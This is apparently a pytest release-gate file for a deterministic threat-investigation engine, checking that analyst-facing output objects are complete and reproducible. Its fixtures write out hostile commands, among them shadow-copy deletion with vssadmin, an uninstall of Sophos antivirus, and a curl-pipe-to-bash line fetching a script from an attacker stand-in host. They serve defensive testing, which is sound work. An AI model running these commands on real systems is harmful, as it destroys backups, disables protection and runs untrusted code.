"""
Investigation Quality Gate (release gate) · 2026-03-01
──────────────────────────────────────────────────────
Rule R11 enforcement: every supported input type MUST produce a
complete Canonical Investigation Object with all required sections
populated.  A release fails if any fixture fails this gate — this is
stronger than "tests passed"; it asserts *analyst-observable*
completeness.

Required SSOT sections (checked for every fixture):

    ✓ metadata          — engine_version + input_bytes
    ✓ health            — check_health() output
    ✓ understanding     — IUE classification
    ✓ plan              — deterministic engine plan (≥1 step)
    ✓ preprocessor      — stage decomposition
    ✓ intent            — attack intent classifier
    ✓ confidence        — overall + signals[]
    ✓ engines_selected  — routing decision

Fixtures cover the frozen input taxonomy:

    · Plain PowerShell
    · Plain CMD
    · PowerShell -EncodedCommand
    · Comma-joined PS re-invocations
    · Vendor prose (Talos IR blog)
    · Bash + curl
    · Bare IOC list
"""
from __future__ import annotations
import base64
import pytest

from services.die.investigation_results import render as render_results


# ── Fixtures ─────────────────────────────────────────────────────
def _b64_enc(script: str) -> str:
    """Encode a PS script the way PowerShell -EncodedCommand expects."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


PLAIN_PS = (
    'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\'
    'CurrentVersion\\Internet Settings" -Name ProxyEnable -Value 0'
)

PLAIN_CMD = (
    "vssadmin delete shadows /all /quiet"
)

ENCODED_PS = (
    "powershell -e "
    + _b64_enc('Set-ItemProperty -Path "HKCU:\\Software\\Test" -Name X -Value 1')
)

COMMA_JOINED_PS = (
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\", "
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\", "
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\""
)

VENDOR_PROSE = (
    "Talos Incident Response engaged with a customer after they "
    "observed lateral movement across their Windows fleet.  The "
    "operator used vssadmin delete shadows /all /quiet, then "
    "wmic product where name=\"Sophos\" call uninstall, then "
    "issued Set-ItemProperty on HKCU:\\Software\\Microsoft\\Windows\\"
    "CurrentVersion\\Internet Settings to disable the proxy.  "
    "Impact stage followed with ransomware deployment."
)

BASH_CURL = "curl -sSL https://attacker.example.com/x.sh | bash"

IOC_LIST = (
    "1.2.3.4\n"
    "https://malware.example.com/payload.bin\n"
    "evil.example.org\n"
    "d41d8cd98f00b204e9800998ecf8427e\n"
)


FIXTURES = [
    ("plain-powershell",         PLAIN_PS),
    ("plain-cmd",                PLAIN_CMD),
    ("encoded-powershell",       ENCODED_PS),
    ("comma-joined-ps",          COMMA_JOINED_PS),
    ("vendor-prose",             VENDOR_PROSE),
    ("bash-curl",                BASH_CURL),
    ("ioc-list",                 IOC_LIST),
]

REQUIRED_SECTIONS = (
    "metadata", "input", "health", "profiling", "understanding",
    "plan", "commands", "iocs", "lolbas", "mitre", "dkp",
    "preprocessor", "intent", "narrative", "behaviour",
    "explanations", "explanation_coverage",
    "confidence", "engines_selected", "engines_skipped",
    # ── IDA · Slice 1 (Rule R14) ──
    "artifacts", "artifact_summary", "ida",
    # ── IDA · Slice 1.6 · Acquisition Plan projection ──
    "acquisition_plan",
)


# ── Rule R17 · Investigation Reproducibility ─────────────────────
def test_quality_gate_engine_versions_recorded():
    """Every SSOT MUST record the semantic version of every engine
    that ran so a re-execution with the same versions produces a
    byte-identical SSOT."""
    r = render_results(PLAIN_PS)
    meta = r["object"]["metadata"]
    versions = meta.get("engine_versions") or {}
    for engine in ("iue", "die", "preprocessor", "bee", "intent"):
        assert engine in versions, f"metadata.engine_versions missing {engine!r}"
    assert meta.get("ruleset_version"), "metadata.ruleset_version missing"


def test_quality_gate_reproducibility_byte_identical():
    """Same input → identical SSOT.  Two independent render() calls
    on PLAIN_PS must produce byte-identical Canonical objects
    (Rule R17)."""
    import json as _json
    a = _json.dumps(render_results(PLAIN_PS)["object"], sort_keys=True)
    b = _json.dumps(render_results(PLAIN_PS)["object"], sort_keys=True)
    assert a == b, "SSOT is not reproducible — two identical renders diverged"


# ── Rule R18 · Behavior Explanation Everywhere ───────────────────
@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_explanation_coverage(fixture_id: str, payload: str):
    """Every fixture MUST expose an explanation_coverage record and,
    when at least one recognised family is present, achieve ≥ 90%
    coverage (Rule R18)."""
    r = render_results(payload)
    cov = r["object"]["explanation_coverage"]
    assert isinstance(cov.get("percentage"), int)
    if cov.get("recognised_targets", 0) > 0:
        assert cov["percentage"] >= 90, (
            f"{fixture_id}: explanation coverage {cov['percentage']}%"
            f" below 90% threshold · gaps={cov['gaps']}")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_explanations_top_level_shape(
    fixture_id: str, payload: str,
):
    """Rule R18 · top-level SSOT.explanations[] is the reusable
    array; every entry MUST carry the universal Explanation Object
    shape."""
    r = render_results(payload)
    explanations = r["object"]["explanations"]
    assert isinstance(explanations, list)
    for e in explanations:
        assert e.get("id")
        assert e.get("target_kind")
        assert e.get("target_id")
        assert isinstance(e.get("what_this_does"), list)
        assert "why_it_matters" in e
        assert isinstance(e.get("evidence"), list)


# ── Schema versioning ────────────────────────────────────────────
def test_quality_gate_schema_versioned():
    """SSOT metadata MUST carry a schema version so future engines
    (IDA, IVE, PCAP, Mach-O) can extend the object without breaking
    existing consumers."""
    r = render_results(PLAIN_PS)
    meta = r["object"]["metadata"]
    assert meta.get("version"), "metadata.version missing"
    assert meta.get("schema") == "investigation-v1", (
        f"unexpected schema id: {meta.get('schema')!r}")


# ── Gate ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_ssot_shape(fixture_id: str, payload: str):
    """Every supported input MUST yield a Canonical Investigation Object
    with all required sections keyed.  Sections may be empty (e.g. no
    IOCs in a plain CMD sample) but the KEY must be present."""
    r = render_results(payload)
    canon = r["object"]
    for section in REQUIRED_SECTIONS:
        assert section in canon, f"{fixture_id}: missing SSOT section {section!r}"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_deterministic_confidence(fixture_id: str, payload: str):
    """Confidence Breakdown must be present and explainable — never
    just a bare number.  ai_inference must always be False in the
    deterministic pipeline."""
    r = render_results(payload)
    conf = r["object"]["confidence"]
    assert isinstance(conf.get("overall"), int)
    assert conf["overall"] >= 0 and conf["overall"] <= 100
    assert conf["ai_inference"] is False
    signals = conf.get("signals") or []
    assert signals, f"{fixture_id}: confidence.signals must not be empty"
    ids = {s.get("id") for s in signals}
    for required in ("health", "decoder", "parser", "mitre", "lolbas",
                     "ioc", "dkp", "evidence", "ai"):
        assert required in ids, f"{fixture_id}: missing confidence signal {required!r}"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_plan_present(fixture_id: str, payload: str):
    """Every fixture must produce ≥ 1 plan step so the analyst sees
    the deterministic execution trace."""
    r = render_results(payload)
    plan = r["object"]["plan"]
    assert isinstance(plan, list) and len(plan) >= 1, (
        f"{fixture_id}: plan must contain ≥ 1 step")
    for step in plan:
        assert step.get("engine")
        assert step.get("action")
        assert step.get("status") in ("done", "pending", "skipped", "failed", "empty")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_health_shape(fixture_id: str, payload: str):
    """Every fixture MUST get a health verdict with ``ok`` + ``ready``
    booleans and ``issues[]`` list.  Non-blocking — even ``ok=False``
    fixtures still emit the section, but plain fixtures should be OK."""
    r = render_results(payload)
    h = r["object"]["health"]
    assert isinstance(h.get("ok"), bool)
    assert isinstance(h.get("ready"), bool)
    assert isinstance(h.get("issues"), list)
    assert isinstance(h.get("checks"), list)


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_understanding_ready(fixture_id: str, payload: str):
    """The IUE must always classify — no fixture may return an empty
    understanding block."""
    r = render_results(payload)
    u = r["object"]["understanding"]
    assert u.get("input_type"), f"{fixture_id}: understanding.input_type missing"
    assert u.get("label"),      f"{fixture_id}: understanding.label missing"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_output_text_never_echoes_input(
    fixture_id: str, payload: str,
):
    """The Investigation Results text pane must NEVER be a copy of the
    input (Rule R10 · Golden Rule).  Enforce by requiring the output
    to contain the section headers we render."""
    r = render_results(payload)
    out = r["output"]
    assert "INVESTIGATION RESULTS" in out, (
        f"{fixture_id}: pane missing 'INVESTIGATION RESULTS' header")
    assert "INPUT HEALTH" in out, (
        f"{fixture_id}: pane missing 'INPUT HEALTH' section")
    assert "INPUT UNDERSTANDING" in out, (
        f"{fixture_id}: pane missing 'INPUT UNDERSTANDING' section")
    assert "CONFIDENCE EXPLANATION" in out, (
        f"{fixture_id}: pane missing 'CONFIDENCE EXPLANATION' section")
    # And it must not simply be `payload` verbatim.
    assert out.strip() != (payload or "").strip(), (
        f"{fixture_id}: pane cannot be a raw echo of the input")


def test_quality_gate_encoded_ps_normalizes_to_decoded_script():
    """Special case: -EncodedCommand payloads must produce a stage
    whose ``normalized_command`` is the DECODED script, never the
    base64 blob.  This is the Node-Inspector correctness contract."""
    script = 'Set-ItemProperty -Path "HKCU:\\Software\\Test" -Name X -Value 1'
    payload = "powershell -e " + _b64_enc(script)
    r = render_results(payload)
    stages = r["object"]["preprocessor"]["stages"]
    assert stages, "no stages built for encoded-powershell fixture"
    normalized = stages[0]["normalized_command"] or ""
    assert "Set-ItemProperty" in normalized, (
        "encoded PowerShell normalized_command must contain the decoded "
        f"script, got: {normalized[:120]!r}")


# ── Quality-of-content gates (R11 · R12 · R13) ────────────────────
def test_quality_gate_narrative_included_in_ssot():
    """R12 · one investigation, one fetch — the SSOT must already
    include the deterministic analyst narrative so the frontend never
    needs a second call to /die/narrate."""
    r = render_results(VENDOR_PROSE)
    narr = r["object"].get("narrative")
    assert isinstance(narr, dict) and narr, "SSOT.narrative missing"
    # Narrative always emits an executive summary + overall assessment
    # + threat progression block.
    assert narr.get("executive_summary") or narr.get("analyst_summary"), (
        "narrative must contain an executive/analyst summary")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_no_engine_reads_raw_input(
    fixture_id: str, payload: str,
):
    """R13 · Engine Independence — no engine may echo the raw input
    into its output section.  We enforce this by asserting the raw
    input string does NOT appear verbatim inside downstream engine
    outputs (narrative summary, analyst summary, plan reasoning)."""
    if not payload.strip():
        pytest.skip("empty fixture — nothing to compare")
    r = render_results(payload)
    obj = r["object"]
    # Trim to a distinctive middle slice so we don't false-positive on
    # short shared tokens.
    if len(payload) >= 60:
        slice_ = payload[len(payload) // 3:len(payload) // 3 + 60]
        # Narrative fields
        narr = obj.get("narrative") or {}
        for key in ("executive_summary", "analyst_summary",
                    "overall_assessment"):
            val = narr.get(key) or ""
            if isinstance(val, str):
                assert slice_ not in val, (
                    f"{fixture_id}: {key} echoed raw input slice")
        # Plan reasoning
        for step in obj.get("plan") or []:
            assert slice_ not in (step.get("reason") or "")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_confidence_always_explainable(
    fixture_id: str, payload: str,
):
    """R10 · every confidence score must carry the trail that
    produced it.  ai_inference must be False in the deterministic
    pipeline for every supported input."""
    r = render_results(payload)
    conf = r["object"]["confidence"]
    assert conf.get("ai_inference") is False, (
        f"{fixture_id}: deterministic pipeline must not report "
        "ai_inference=True")
    # Every signal must have status + label.
    for s in conf.get("signals") or []:
        assert s.get("label")
        assert s.get("status") in ("passed", "partial", "missing", "skipped")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_plan_covers_iue_and_preprocessor(
    fixture_id: str, payload: str,
):
    """Every plan MUST include the IUE classify step + a preprocessor
    stage-extract step.  These are the minimal deterministic passes
    every input flows through."""
    r = render_results(payload)
    engines = {(s.get("engine") or "").lower() for s in r["object"]["plan"]}
    assert "iue" in engines,        f"{fixture_id}: plan missing IUE step"
    assert "preprocessor" in engines, (
        f"{fixture_id}: plan missing preprocessor step")




# ══════════════════════════════════════════════════════════════════
# Rule R14 · IDA (Slice 1) — Artifact Splitter integration gate
# ══════════════════════════════════════════════════════════════════
@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_ida_block_present(fixture_id: str, payload: str):
    """Every fixture MUST expose SSOT.ida / artifacts / artifact_summary.
    Rule R14 — IDA is the only engine allowed to acquire / split
    artifacts, and its verdict is analyst-visible in the SSOT."""
    r = render_results(payload)
    canon = r["object"]

    ida = canon["ida"]
    assert ida.get("ida_class") in (
        "threat_report_url", "code_snippet_url", "repository_url",
        "file_resource_url", "ioc_portal_url", "atomic_ioc_url",
        "mixed_artifacts", "ioc_list",
        "yara_ruleset", "sigma_ruleset", "none",
    ), f"{fixture_id}: unexpected ida_class {ida.get('ida_class')!r}"
    assert 0.0 <= ida.get("confidence", 0.0) <= 1.0
    assert isinstance(ida.get("reasoning"), list)

    assert isinstance(canon["artifacts"], list)
    assert isinstance(canon["artifact_summary"], dict)


def test_quality_gate_ida_ioc_list_class():
    """The IOC list fixture MUST route to `ioc_list` — proves the IDA
    verdict is real, not a rubber-stamp `none` for every input."""
    r = render_results(IOC_LIST)
    assert r["object"]["ida"]["ida_class"] == "ioc_list"
    # And the artifact_summary must count the constituent kinds.
    summary = r["object"]["artifact_summary"]
    assert summary.get("hash", 0) >= 1
    assert summary.get("url", 0) >= 1
    assert summary.get("domain", 0) >= 1
    assert summary.get("ip", 0) >= 1


def test_quality_gate_ida_provenance_on_every_artifact():
    """Rule R14 + IDA-7: every artifact MUST carry provenance
    (offset, length, line, extractor).  Without provenance the
    Evidence projection cannot jump back to the source."""
    r = render_results(IOC_LIST)
    for a in r["object"]["artifacts"]:
        src = a.get("source") or {}
        assert isinstance(src.get("offset"), int), a
        assert isinstance(src.get("length"), int) and src["length"] > 0, a
        assert isinstance(src.get("line"), int) and src["line"] >= 1, a
        assert src.get("extractor", "").startswith("ida."), a


def test_quality_gate_ida_engine_version_recorded():
    """SSOT.metadata.engine_versions MUST include IDA so investigations
    are reproducible against a pinned IDA release (Rule R17)."""
    r = render_results(IOC_LIST)
    versions = r["object"]["metadata"]["engine_versions"]
    assert "ida" in versions, "engine_versions must record IDA"
    assert versions["ida"].startswith("1."), (
        f"unexpected IDA version {versions['ida']!r}")


# ══════════════════════════════════════════════════════════════════
# Slice 1.6 · URL Intent + Acquisition Plan gate
# ══════════════════════════════════════════════════════════════════
ESENTIRE_URL = "https://www.esentire.com/blog/email-bombing-it-impersonation-quick-assist-and-edgecution-breaking-down-unc6692s-tradecraft"
PASTEBIN_URL = "https://pastebin.com/RaW/abc123"
GITHUB_URL   = "https://github.com/mitre/attack"
VT_URL       = "https://www.virustotal.com/gui/file/deadbeef"
BITLY_URL    = "https://bit.ly/x9x9x9"


def test_url_intent_esentire_is_threat_report():
    r = render_results(ESENTIRE_URL)
    canon = r["object"]
    assert canon["ida"]["ida_class"] == "threat_report_url"
    intent = canon["ida"]["url_intent"]
    assert intent["intent"] == "threat_report"
    assert intent["acquirable"] is True
    assert intent["vendor"] == "eSentire"
    plan = canon["acquisition_plan"]
    assert len(plan) >= 8, "threat_report plan must include acquisition + extractors + report"
    # IDA-1 + IDA-2 are always deterministic → always `done`.
    by_id = {s["id"]: s for s in plan}
    assert by_id["ida-1"]["status"] == "done"
    assert by_id["ida-2"]["status"] == "done"
    # IDA-3 status depends on whether the acquisition pass ran to
    # completion.  When it did, `acquired_document.ok` is True and
    # every downstream step is marked `done`.
    acq = canon.get("acquired_document") or {}
    if acq.get("ok"):
        assert by_id["ida-3"]["status"] == "done", (
            "Rule R19 · when IDA-3 succeeds, plan step MUST be done")
        assert by_id["ida-3.5"]["status"] == "done"
    else:
        # Network / vendor unavailable — the plan surface must still
        # tell the analyst what step failed, not stay silent.
        assert by_id["ida-3"]["status"] == "pending"


def test_url_intent_pastebin_is_code_snippet():
    r = render_results(PASTEBIN_URL)
    canon = r["object"]
    assert canon["ida"]["ida_class"] == "code_snippet_url"
    assert canon["ida"]["url_intent"]["intent"] == "code_snippet"
    assert canon["ida"]["url_intent"]["acquirable"] is True


def test_url_intent_github_is_repository():
    r = render_results(GITHUB_URL)
    canon = r["object"]
    assert canon["ida"]["ida_class"] == "repository_url"
    assert canon["ida"]["url_intent"]["intent"] == "repository"
    assert canon["ida"]["url_intent"]["acquirable"] is True


def test_url_intent_virustotal_is_ioc_portal_not_acquirable():
    r = render_results(VT_URL)
    canon = r["object"]
    assert canon["ida"]["ida_class"] == "ioc_portal_url"
    intent = canon["ida"]["url_intent"]
    assert intent["intent"] == "ioc_portal"
    assert intent["acquirable"] is False


def test_url_intent_shortener_stays_atomic_ioc():
    r = render_results(BITLY_URL)
    canon = r["object"]
    assert canon["ida"]["ida_class"] == "atomic_ioc_url"
    assert canon["ida"]["url_intent"]["intent"] == "atomic_ioc"
    assert canon["ida"]["url_intent"]["acquirable"] is False
    # No acquisition plan steps beyond the routing decision.
    plan = canon["acquisition_plan"]
    assert all(step["id"] in ("ida-1", "ida-2", "ioc") for step in plan)


def test_acquisition_plan_empty_for_non_url_inputs():
    """Mixed pastes and command inputs must NOT get a URL acquisition
    plan — those live in the atomic artifact path (SSOT.commands etc)."""
    r = render_results("powershell -e QQBBAA==")
    assert r["object"]["acquisition_plan"] == []

